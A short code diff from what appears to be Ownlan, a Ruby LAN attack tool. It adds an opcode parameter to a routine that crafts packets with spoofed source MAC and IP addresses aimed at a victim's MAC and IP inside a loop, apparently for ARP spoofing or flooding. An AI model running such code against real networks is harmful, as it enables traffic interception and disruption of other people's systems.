@@ -8,12 +8,13 @@ module Ownlan
         @c = 10
         @i = 0
 
-        saddr = "00:03:FF:#{@a}:#{@b}:#{@c}"
-        daddr = victim_mac
-        saddr_ip = "#{source_ip_base}.#{@b}.#{@c}"
-        daddr_ip = victim_ip
+        saddr          = "00:03:FF:#{@a}:#{@b}:#{@c}"
+        daddr          = victim_mac
+        saddr_ip       = "#{source_ip_base}.#{@b}.#{@c}"
+        daddr_ip       = victim_ip
+        opcode         = 1
 
-        crafted_packet = packet_craft(saddr, daddr, saddr_ip, daddr_ip).call
+        crafted_packet = packet_craft(saddr, daddr, saddr_ip, daddr_ip, opcode).call
 
         loop do
           while @a < 100 do
